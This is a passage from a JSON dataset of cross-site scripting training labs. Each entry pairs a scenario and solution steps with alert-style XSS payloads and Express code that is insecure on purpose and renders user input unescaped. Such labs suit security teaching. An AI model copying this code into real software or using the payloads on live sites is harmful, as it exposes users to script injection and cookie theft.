      "<script>alert('Calc XSS')</script>",
      "<img src=x onerror=alert('Calc XSS')>",
      "<svg/onload=alert('Calc XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/calculator', (req, res) => {\n  const expression = req.query.expr;\n  res.send(`<html><body><h2>Result:</h2><div>${expression}</div></body></html>`);\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Reflected XSS in Online Ticket Booking Summary",
    "Lab Description": "A travel site reflects ticket details from the query string into the booking summary using innerHTML without sanitization, exposing a reflected XSS vector.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Navigate to the summary page with a malicious `name` parameter.",
      "Observe script execution when the page renders the booking summary."
    ],
    "payloads": [
      "<script>alert('Booking XSS')</script>",
      "<img src=x onerror=alert('Booking XSS')>",
      "<svg/onload=alert('Booking XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/booking-summary', (req, res) => {\n  const name = req.query.name;\n  res.send(`<html><body><h1>Your Booking</h1><p>Passenger: ${name}</p></body></html>`);\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in Team Collaboration Notes",
    "Lab Description": "A collaboration app lets team members add notes to shared boards. Notes are stored and rendered using raw HTML without escaping, enabling persistent XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit a note with a script tag.",
      "View the shared board as another user and observe script execution."
    ],
    "payloads": [
      "<script>alert('Note XSS')</script>",
      "<img src=x onerror=alert('Note XSS')>",
      "<svg/onload=alert('Note XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet notes = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/add-note', (req, res) => {\n  notes.push(req.body.content);\n  res.redirect('/board');\n});\napp.get('/board', (req, res) => {\n  let html = '<html><body><h2>Team Board</h2>';\n  notes.forEach(n => { html += `<div>${n}</div>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "DOM-based XSS in Forum Topic Preview",
    "Lab Description": "A forum allows previewing a topic by parsing the `#preview` hash and inserting it via innerHTML. JavaScript in the hash executes due to no sanitization.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Craft a URL with a malicious `#preview` fragment.",
      "Visit the preview page and observe XSS triggered from the DOM."
    ],
    "payloads": [
      "<script>alert('Preview XSS')</script>",
      "<img src=x onerror=alert('Preview XSS')>",
      "<svg/onload=alert('Preview XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/preview-topic', (req, res) => {\n  res.send(`<html><body><h1>Preview</h1><div id='content'></div><script>document.getElementById('content').innerHTML = location.hash.slice(1);</script></body></html>`);\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Reflected XSS in E-commerce Discount Preview",
    "Lab Description": "A discount preview feature reflects the coupon code from the query string into a message without sanitization. JavaScript payloads in the parameter result in XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Access the preview page with a malicious `code` parameter.",
      "Observe the reflected value rendering unescaped and executing."
    ],
    "payloads": [
      "<script>alert('Discount XSS')</script>",
      "<img src=x onerror=alert('Discount XSS')>",
      "<svg/onload=alert('Discount XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/discount-preview', (req, res) => {\n  const code = req.query.code;\n  res.send(`<html><body><h1>Your Discount</h1><p>${code}</p></body></html>`);\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in Custom Badge Generator",
    "Lab Description": "Users can create custom badges with titles. These titles are stored and rendered across the platform using innerHTML, allowing XSS if script tags are submitted.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit a badge title with JavaScript payload.",
      "Browse the badge listing page and confirm XSS execution."
    ],
    "payloads": [
      "<script>alert('Badge XSS')</script>",
      "<img src=x onerror=alert('Badge XSS')>",
      "<svg/onload=alert('Badge XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet badges = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/create-badge', (req, res) => {\n  badges.push(req.body.title);\n  res.redirect('/badges');\n});\napp.get('/badges', (req, res) => {\n  let html = '<html><body><h1>Custom Badges</h1>';\n  badges.forEach(b => { html += `<div>${b}</div>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Payment Gateway Redirect URL",
    "Lab Description": "An e-commerce site integrates a third-party payment gateway that redirects users back to a user-specified return URL after payment. The application reflects the `returnUrl` parameter on the payment status page without proper encoding, making it vulnerable to XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Go to the checkout page and proceed to payment.",
      "Intercept the redirect URL and modify the `returnUrl` to contain a script payload.",
      "Observe the final payment status page reflecting the script from the returnUrl."
    ],
    "payloads": [
      "<script>alert('XSS Payment')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert('XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const port = 3000; app.get('/payment-status', (req, res) => { const returnUrl = req.query.returnUrl || '/'; res.send(`<html><body><h2>Payment Status</h2><p>Redirecting to: ${returnUrl}</p></body></html>`); }); app.listen(port);"
  },
  {
    "Lab scenario": "XSS in Dynamic Modal Dialog",
    "Lab Description": "A blog platform dynamically creates modal dialogs using data from query parameters for showing user-submitted alerts. The `message` parameter is inserted directly into the modal content without sanitization, allowing XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Navigate to the modal alert page with a `message` parameter in the URL.",
      "Inject JavaScript code in the parameter and confirm execution in the modal."
    ],
    "payloads": [
      "<script>alert('XSS Modal')</script>",
      "<div onmouseover=alert('XSS')>Hover me</div>",
      "<img src=x onerror=alert('XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const port = 3000; app.get('/modal', (req, res) => { const message = req.query.message || 'No message'; res.send(`<html><body><div id='modal'>${message}</div></body></html>`); }); app.listen(port);"
  },
  {
    "Lab scenario": "XSS in Notification Popups",
    "Lab Description": "The application retrieves notifications from user profiles and inserts them directly into DOM via innerHTML to display popups. The notification content is not sanitized server-side, leading to a stored XSS vulnerability.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Login and post a notification message containing a payload.",
      "Switch to another user account and trigger the popup display.",
      "Observe script execution from stored content."
    ],
    "payloads": [
      "<script>alert('XSS Notify')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const port = 3000; let notifications = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/submit', (req, res) => { res.send(`<form method='POST'><input name='msg'><button type='submit'>Send</button></form>`); }); app.post('/submit', (req, res) => { notifications.push(req.body.msg); res.redirect('/notifications'); }); app.get('/notifications', (req, res) => { const notifHTML = notifications.map(n => `<div>${n}</div>`).join(''); res.send(`<html><body>${notifHTML}</body></html>`); }); app.listen(port);"
  },
  {
    "Lab scenario": "XSS in Survey Preview Feature",
    "Lab Description": "The survey builder feature allows users to preview their questions before submission. The preview uses unescaped question text provided in a query string parameter, which is directly embedded in the preview page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Access the survey builder preview page with a malicious question input.",
      "Insert a payload via the URL and observe script execution on the preview."
    ],
    "payloads": [
      "<script>alert('Survey XSS')</script>",
      "<svg/onload=alert('Survey')>",
      "<iframe src='javascript:alert(`XSS`)'></iframe>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const port = 3000; app.get('/survey-preview', (req, res) => { const q = req.query.q || 'No question'; res.send(`<html><body><h3>Preview:</h3><p>${q}</p></body></html>`); }); app.listen(port);"
  },
  {
    "Lab scenario": "XSS via Document Title in Analytics Dashboard",
    "Lab Description": "An analytics dashboard generates a custom report title from user input and reflects it in the document title. The title is inserted using template literals in a script block, allowing DOM-based XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit a custom title with a script payload.",
      "Observe the title being reflected unsafely in a JavaScript block on the dashboard.",
      "Trigger the payload and confirm execution."
    ],
    "payloads": [
      "`;alert('XSS')//",
      "';alert(1);//",
      "\";alert(1);//"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const port = 3000; app.get('/dashboard', (req, res) => { const title = req.query.title || 'Report'; res.send('<html><head><script>document.title = \"' + title + '\";</script></head><body><h1>Dashboard</h1></body></html>'); }); app.listen(port);"
  },
  {
    "Lab scenario": "Reflected XSS in Email Invitation Preview",
    "Lab Description": "An internal tool allows team members to preview email invitations before sending. The email message is reflected directly from the `message` query parameter into the email body preview page without encoding.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Navigate to the invitation preview page with a custom `message` parameter.",
      "Inject an XSS payload in the `message` parameter.",
      "Observe the payload execution within the preview."
    ],
    "payloads": [
      "<script>alert('Email XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert('XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const port = 3000; app.get('/preview-invite', (req, res) => { const message = req.query.message || 'Join our team!'; res.send(`<html><body><h3>Invitation Preview</h3><div>${message}</div></body></html>`); }); app.listen(port);"
  },
  {
    "Lab scenario": "XSS in Job Application Confirmation Page",
    "Lab Description": "After submitting a job application, users are redirected to a confirmation page that shows their submitted name. The name is reflected into the DOM without sanitization.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Go to the job application form and submit a name containing an XSS payload.",
      "Observe the reflected confirmation page executing the script."
    ],
    "payloads": [
      "<script>alert('XSS Confirm')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<div onmouseover=alert(1)>Hover me</div>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const port = 3000; app.get('/apply', (req, res) => { res.send(`<form method='POST'><input name='fullname'><button type='submit'>Apply</button></form>`); }); app.post('/apply', (req, res) => { const name = req.body.fullname || 'Anonymous'; res.send(`<html><body><h2>Thank you ${name} for applying!</h2></body></html>`); }); app.listen(port);"
  },
  {
    "Lab scenario": "Stored XSS in Forum Signature",
    "Lab Description": "A discussion forum allows users to set custom signatures. These signatures are displayed under every post without being sanitized, making it a vector for stored XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Update the profile signature with a JavaScript payload.",
      "Create or reply to a post to trigger the signature rendering.",
      "View the post and observe script execution from the stored signature."
    ],
    "payloads": [
      "<script>alert('Forum XSS')</script>",
      "<svg/onload=alert(1)>",
      "<img src=x onerror=alert(document.cookie)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const port = 3000; let userSignature = ''; app.get('/profile', (req, res) => { res.send(`<form method='POST'><input name='sig'><button type='submit'>Update Signature</button></form>`); }); app.post('/profile', (req, res) => { userSignature = req.body.sig; res.redirect('/post'); }); app.get('/post', (req, res) => { res.send(`<html><body><p>User post content</p><div>${userSignature}</div></body></html>`); }); app.listen(port);"
  },
  {
    "Lab scenario": "DOM XSS via Fragment Identifier Injection",
    "Lab Description": "A client-side script reads the URL fragment (`window.location.hash`) and writes it directly to the DOM to display a section title. No sanitization is performed.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Access the vulnerable page with a payload in the URL fragment (after #).",
      "Observe that the script injects the fragment content into the page DOM.",
      "Payload execution confirms DOM XSS."
    ],
    "payloads": [
      "#<script>alert('DOM XSS')</script>",
      "#<img src=x onerror=alert(1)>",
      "#<svg/onload=alert('XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const port = 3000; app.get('/', (req, res) => { res.send(`<html><body><h1>Fragment Demo</h1><div id='section'></div><script>document.getElementById('section').innerHTML = window.location.hash.substring(1);</script></body></html>`); }); app.listen(port);"
  },
  {
    "Lab scenario": "XSS in Help Center Feedback Box",
    "Lab Description": "A help center page allows users to submit feedback. Submitted messages are displayed to admins without proper encoding, allowing a stored XSS attack via the feedback box.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit feedback with a malicious payload.",
      "Login as admin and visit the feedback dashboard.",
      "Observe the XSS payload execution."
    ],
    "payloads": [
      "<script>alert('Feedback XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<iframe src='javascript:alert(1)'></iframe>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const port = 3000; const feedbacks = []; app.get('/feedback', (req, res) => { res.send(`<form method='POST'><textarea name='fb'></textarea><button type='submit'>Submit</button></form>`); }); app.post('/feedback', (req, res) => { feedbacks.push(req.body.fb); res.redirect('/admin'); }); app.get('/admin', (req, res) => { const fbHTML = feedbacks.map(fb => `<div>${fb}</div>`).join(''); res.send(`<html><body><h2>Feedback</h2>${fbHTML}</body></html>`); }); app.listen(port);"
  },
  {
    "Lab scenario": "XSS in Bug Tracker Ticket Title",
    "Lab Description": "A bug tracking system displays ticket titles in the admin dashboard without sanitizing user input. Attackers can exploit this by creating a ticket with an XSS payload as the title.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a new ticket with a malicious script in the title field.",
      "Login as admin and view the ticket dashboard.",
      "The XSS payload is executed in the admin context."
    ],
    "payloads": [
      "<script>alert('Bug XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const port = 3000; app.use(bodyParser.urlencoded({ extended: true })); const tickets = []; app.get('/submit-ticket', (req, res) => { res.send(`<form method='POST'><input name='title'><button type='submit'>Submit Ticket</button></form>`); }); app.post('/submit-ticket', (req, res) => { tickets.push(req.body.title); res.redirect('/admin-tickets'); }); app.get('/admin-tickets', (req, res) => { const list = tickets.map(t => `<li>${t}</li>`).join(''); res.send(`<ul>${list}</ul>`); }); app.listen(port);"
  },
  {
    "Lab scenario": "XSS in File Sharing Platform Filename",
    "Lab Description": "A file sharing platform shows uploaded filenames in a list. Filenames containing scripts are rendered directly into the page without sanitization, leading to stored XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Upload a file with a malicious name containing an XSS payload.",
      "Visit the shared file listing page.",
      "Payload gets executed when the filename is rendered."
    ],
    "payloads": [
      "<script>alert('File XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<video><source onerror=alert('XSS')></video>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const port = 3000; app.use(bodyParser.urlencoded({ extended: true })); const files = []; app.get('/upload', (req, res) => { res.send(`<form method='POST'><input name='filename'><button type='submit'>Upload</button></form>`); }); app.post('/upload', (req, res) => { files.push(req.body.filename); res.redirect('/files'); }); app.get('/files', (req, res) => { const list = files.map(f => `<li>${f}</li>`).join(''); res.send(`<html><body><ul>${list}</ul></body></html>`); }); app.listen(port);"
  },
  {
    "Lab scenario": "XSS in Blog Comment Timestamp Field",
    "Lab Description": "A blogging platform allows users to specify the time of their comment. The timestamp is rendered directly into the HTML without encoding, which allows for a reflected XSS attack.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a comment with a malicious script as the timestamp.",
      "The script is reflected and executed when viewing the blog post."
    ],
    "payloads": [
      "<script>alert('Timestamp XSS')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const port = 3000; app.use(bodyParser.urlencoded({ extended: true })); const comments = []; app.get('/post', (req, res) => { res.send(`<form method='POST'><input name='text'><input name='time'><button type='submit'>Comment</button></form>`); }); app.post('/post', (req, res) => { comments.push({ text: req.body.text, time: req.body.time }); res.redirect('/view-post'); }); app.get('/view-post', (req, res) => { const list = comments.map(c => `<p>${c.text} at ${c.time}</p>`).join(''); res.send(`<html><body>${list}</body></html>`); }); app.listen(port);"
  },
  {
    "Lab scenario": "DOM XSS in Search Filter Category",
    "Lab Description": "An e-commerce site uses JavaScript to display the selected category from the URL hash (e.g., `#category=shoes`). The value is injected directly into the DOM without sanitization.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Craft a URL with a malicious category value in the hash.",
      "When visited, the payload is inserted into the DOM and executed."
    ],
    "payloads": [
      "#category=<script>alert('DOM Category')</script>",
      "#category=<img src=x onerror=alert(1)>",
      "#category=<svg/onload=alert('XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const port = 3000; app.get('/', (req, res) => { res.send(`<html><body><div id='cat'></div><script>const cat = location.hash.split('=')[1]; document.getElementById('cat').innerHTML = cat;</script></body></html>`); }); app.listen(port);"
  },
  {
    "Lab scenario": "XSS in Newsletter Subscription Response",
    "Lab Description": "A newsletter subscription endpoint reflects the user's email in the response message. This reflection is done insecurely, allowing attackers to inject scripts via the email field.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit a subscription form with a script as the email.",
      "Observe the confirmation message executing the payload."
    ],
    "payloads": [
      "<script>alert('Newsletter XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const port = 3000; app.use(bodyParser.urlencoded({ extended: true })); app.get('/subscribe', (req, res) => { res.send(`<form method='POST'><input name='email'><button type='submit'>Subscribe</button></form>`); }); app.post('/subscribe', (req, res) => { const email = req.body.email; res.send(`<html><body>Thanks for subscribing, ${email}</body></html>`); }); app.listen(port);"
  },
  {
    "Lab scenario": "XSS in Help Desk Ticket Notes",
    "Lab Description": "A help desk application allows support agents to add notes to user tickets. These notes are rendered in the admin panel without sanitization, leading to stored XSS when a malicious note is added.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Login as a support agent.",
      "Submit a ticket note containing an XSS payload.",
      "When the admin views the ticket, the payload executes."
    ],
    "payloads": [
      "<script>alert('HelpDeskXSS')</script>",
      "<img src=x onerror=alert(1337)>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const port = 3000; app.use(bodyParser.urlencoded({ extended: true })); const notes = []; app.get('/add-note', (req, res) => { res.send(`<form method='POST'><textarea name='note'></textarea><button type='submit'>Submit</button></form>`); }); app.post('/add-note', (req, res) => { notes.push(req.body.note); res.redirect('/admin-panel'); }); app.get('/admin-panel', (req, res) => { const allNotes = notes.map(n => `<div>${n}</div>`).join(''); res.send(`<html><body>${allNotes}</body></html>`); }); app.listen(port);"
  },
  {
    "Lab scenario": "Reflected XSS in Job Application Search",
    "Lab Description": "A job portal allows searching applicants using a keyword in the query string. The search term is reflected back into the page without proper escaping, making it vulnerable to reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Craft a URL with a malicious script in the search query.",
      "Visit the search results page to trigger the payload."
    ],
    "payloads": [
      "?search=<script>alert('SearchXSS')</script>",
      "?search=<img src=x onerror=alert(1)>",
      "?search=<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const port = 3000; app.get('/search', (req, res) => { const query = req.query.search || ''; res.send(`<html><body>Results for: ${query}</body></html>`); }); app.listen(port);"
  },
  {
    "Lab scenario": "XSS in Community Event Organizer Location Input",
    "Lab Description": "A community platform lets organizers create events and input the event location. The location is displayed on the event page without sanitization, leading to stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create an event with a location containing an XSS payload.",
      "Visit the event page where the payload is displayed.",
      "The script executes when the location is rendered."
    ],
    "payloads": [
      "<script>alert('LocationXSS')</script>",
      "<img src=x onerror=alert('Event')>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const port = 3000; app.use(bodyParser.urlencoded({ extended: true })); const events = []; app.get('/create-event', (req, res) => { res.send(`<form method='POST'><input name='name'><input name='location'><button type='submit'>Create</button></form>`); }); app.post('/create-event', (req, res) => { events.push({ name: req.body.name, location: req.body.location }); res.redirect('/events'); }); app.get('/events', (req, res) => { const list = events.map(e => `<h2>${e.name}</h2><p>${e.location}</p>`).join(''); res.send(`<html><body>${list}</body></html>`); }); app.listen(port);"
  },
  {
    "Lab scenario": "XSS in Banking Support Chat Transcript Viewer",
    "Lab Description": "Banking admins can view past support chat transcripts. If a malicious user injects a script into a chat message, it is displayed in the admin panel without sanitization.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send a message with an XSS payload in the support chat.",
      "When the admin reviews the transcript, the payload executes."
    ],
    "payloads": [
      "<script>alert('BankXSS')</script>",
      "<img src=x onerror=alert('Chat')>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const port = 3000; app.use(bodyParser.urlencoded({ extended: true })); const chats = []; app.get('/support', (req, res) => { res.send(`<form method='POST'><input name='msg'><button type='submit'>Send</button></form>`); }); app.post('/support', (req, res) => { chats.push(req.body.msg); res.redirect('/admin-chat'); }); app.get('/admin-chat', (req, res) => { const chatLog = chats.map(c => `<div>${c}</div>`).join(''); res.send(`<html><body>${chatLog}</body></html>`); }); app.listen(port);"
  },
  {
    "Lab scenario": "XSS in Real Estate Listing Description",
    "Lab Description": "A real estate portal allows sellers to add property listings with descriptions. Malicious users can inject scripts into the description, which are executed when viewed by others.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create a listing with a malicious description.",
      "View the listing detail page to trigger the XSS."
    ],
    "payloads": [
      "<script>alert('ListingXSS')</script>",
      "<img src=x onerror=alert('Desc')>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const port = 3000; app.use(bodyParser.urlencoded({ extended: true })); const listings = []; app.get('/new-listing', (req, res) => { res.send(`<form method='POST'><input name='title'><textarea name='desc'></textarea><button type='submit'>Post</button></form>`); }); app.post('/new-listing', (req, res) => { listings.push({ title: req.body.title, desc: req.body.desc }); res.redirect('/listings'); }); app.get('/listings', (req, res) => { const rendered = listings.map(l => `<h3>${l.title}</h3><p>${l.desc}</p>`).join(''); res.send(`<html><body>${rendered}</body></html>`); }); app.listen(port);"
  },
  {
    "Lab scenario": "XSS in Social Media Hashtag Search",
    "Lab Description": "A social media platform allows users to search for hashtags. The searched term is directly reflected in the page content without sanitization, making it vulnerable to reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Navigate to the hashtag search page with a malicious query string.",
      "The XSS payload is reflected and executed."
    ],
    "payloads": [
      "?tag=<script>alert('Hashtag')</script>",
      "?tag=<img src=x onerror=alert('XSS')>",
      "?tag=<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const port = 3000; app.get('/search-tag', (req, res) => { const tag = req.query.tag || ''; res.send(`<html><body>Showing results for: ${tag}</body></html>`); }); app.listen(port);"
  },
  {
    "Lab scenario": "Stored XSS in Product Inventory Notes",
    "Lab Description": "Warehouse staff can leave notes on products. These notes are shown on the inventory dashboard, which renders unsanitized HTML, leading to stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Add a note with XSS content to a product.",
      "Access the inventory dashboard to trigger the XSS."
    ],
    "payloads": [
      "<script>alert('Inventory')</script>",
      "<img src=x onerror=alert('Note')>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const port = 3000; app.use(bodyParser.urlencoded({ extended: true })); const inventory = []; app.get('/add-note', (req, res) => { res.send(`<form method='POST'><input name='item'><textarea name='note'></textarea><button type='submit'>Add</button></form>`); }); app.post('/add-note', (req, res) => { inventory.push({ item: req.body.item, note: req.body.note }); res.redirect('/dashboard'); }); app.get('/dashboard', (req, res) => { const list = inventory.map(i => `<h4>${i.item}</h4><p>${i.note}</p>`).join(''); res.send(`<html><body>${list}</body></html>`); }); app.listen(port);"
  },
  {
    "Lab scenario": "XSS in Developer Forum Signature",
    "Lab Description": "Developers can add signatures to their forum profile. These signatures are shown in each post and are rendered as HTML without sanitization, introducing stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Edit your signature with a malicious payload.",
      "Post a message in the forum.",
      "Anyone viewing the post sees the XSS executed."
    ],
    "payloads": [
      "<script>alert('Signature')</script>",
      "<img src=x onerror=alert('Forum')>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const port = 3000; app.use(bodyParser.urlencoded({ extended: true })); let signature = ''; const posts = []; app.get('/set-signature', (req, res) => { res.send(`<form method='POST'><textarea name='sig'></textarea><button type='submit'>Set</button></form>`); }); app.post('/set-signature', (req, res) => { signature = req.body.sig; res.redirect('/forum'); }); app.get('/post', (req, res) => { res.send(`<form method='POST'><input name='content'><button type='submit'>Post</button></form>`); }); app.post('/post', (req, res) => { posts.push(req.body.content); res.redirect('/forum'); }); app.get('/forum', (req, res) => { const html = posts.map(p => `<div>${p}<footer>${signature}</footer></div>`).join(''); res.send(`<html><body>${html}</body></html>`); }); app.listen(port);"
  },
  {
    "Lab scenario": "Stored XSS in Real-Time Auction Comments",
    "Lab Description": "Users can comment on live auction items. These comments are stored and displayed on the bidding page without any sanitization, allowing persistent XSS attacks.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Post a comment with XSS on an auction item.",
      "Open the auction page to see the comment executed."
    ],
    "payloads": [
      "<script>alert('Auction')</script>",
      "<img src=x onerror=alert('Bid')>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const port = 3000; app.use(bodyParser.urlencoded({ extended: true })); const comments = []; app.get('/auction-comment', (req, res) => { res.send(`<form method='POST'><textarea name='comment'></textarea><button type='submit'>Submit</button></form>`); }); app.post('/auction-comment', (req, res) => { comments.push(req.body.comment); res.redirect('/live-auction'); }); app.get('/live-auction', (req, res) => { const rendered = comments.map(c => `<p>${c}</p>`).join(''); res.send(`<html><body>${rendered}</body></html>`); }); app.listen(port);"
  },
  {
    "Lab scenario": "XSS in Academic Portal Feedback Form",
    "Lab Description": "A university feedback form allows students to submit anonymous reviews. These reviews are shown to lecturers in their dashboard without proper escaping.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit feedback containing a JavaScript payload.",
      "Lecturer logs in to their dashboard and sees the review.",
      "The script is executed in the lecturer's browser."
    ],
    "payloads": [
      "<script>alert('Feedback')</script>",
      "<img src=x onerror=alert('Prof')>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const port = 3000; app.use(bodyParser.urlencoded({ extended: true })); const feedbacks = []; app.get('/feedback', (req, res) => { res.send(`<form method='POST'><textarea name='review'></textarea><button type='submit'>Submit</button></form>`); }); app.post('/feedback', (req, res) => { feedbacks.push(req.body.review); res.redirect('/lecturer'); }); app.get('/lecturer', (req, res) => { const html = feedbacks.map(f => `<blockquote>${f}</blockquote>`).join(''); res.send(`<html><body>${html}</body></html>`); }); app.listen(port);"
  },
  {
    "Lab scenario": "XSS in Recently Viewed Items Feature",
    "Lab Description": "The application shows a list of recently viewed items using local storage values. These values are injected directly into the DOM on page load without proper sanitization, allowing DOM-based XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Open the browser console and inject a malicious item into localStorage.",
      "Refresh the page and observe the stored item being inserted into the DOM without sanitization.",
      "Verify JavaScript execution from localStorage."
    ],
    "payloads": [
      "<img src=x onerror=alert(1)>",
      "<script>alert('XSS')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const port = 3000; app.get('/', (req, res) => { res.send(`<html><head><title>Shop</title></head><body><h1>Recently Viewed</h1><ul id='recent'></ul><script>const items = JSON.parse(localStorage.getItem('recent') || '[]');items.forEach(item => {document.getElementById('recent').innerHTML += '<li>' + item + '</li>';});</script></body></html>`); }); app.listen(port);"
  },
  {
    "Lab scenario": "XSS in User Bio Tooltip Feature",
    "Lab Description": "User bios are displayed as tooltips when hovering over usernames. The bios are rendered using the title attribute directly from unescaped user input, enabling stored XSS via malicious bios.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Register or modify a user with a bio that includes an XSS payload.",
      "Hover over the username on the profile list page.",
      "Observe the execution of JavaScript in the tooltip."
    ],
    "payloads": [
      "\"><img src=x onerror=alert(1)>",
      "\"><svg/onload=alert('XSS')>"
    ],
